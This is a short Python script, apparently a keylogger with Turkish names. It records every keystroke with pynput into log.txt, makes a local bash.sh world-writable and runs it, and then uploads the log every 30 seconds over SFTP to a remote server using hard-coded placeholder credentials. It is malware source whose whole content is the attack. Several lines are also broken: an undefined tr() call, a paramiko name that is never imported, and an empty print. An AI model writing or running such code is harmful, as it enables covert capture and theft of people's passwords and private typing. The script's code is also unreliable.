from paramiko import SSHClient, AutoAddPolicy, RSAKey
from paramiko.auth_handler import AuthenticationException, SSHException
import os
import time
from pynput.keyboard import Key,Listener

count=0
keys=[]

def on_press(key):
    global keys,count

    keys.append(key)
    count += 1
    print("".format(key))

    if count >= 10:
        count=0
        write_file(keys)
        keys=[]


def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'" ,"")
          #  if k.find(b"space")>0:
           #     f.write('\n')
            #elif k.find("Key")== -1:
            f.write(k)

def on_release(key):
    if key==Key.esc:
        return False
		
def gonder_abisi(dosya,kayityeri):
	ssh = paramiko.SSHClient()
	ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
	ssh.connect("sunucuadi", username="kullaniciadi", password="sifre")
	sftp = ssh.open_sftp()
	sftp.put(dosya, kayityeri)
	sftp.close()
	ssh.close()

with Listener(on_press=on_press, on_release=on_release) as listenner:
    listenner.join()

os.system("chmod 777 bash.sh")
os.system("./bash.sh") #gerekli dosyalarÄ± yÃ¼kledfgf


starttime = time.time()
while True:
	gonder_abisi("log.txt","/root/kayitlar/log"+tr(time.time())+".txt")
	time.sleep(30.0 - ((time.time() - starttime) % 30.0))
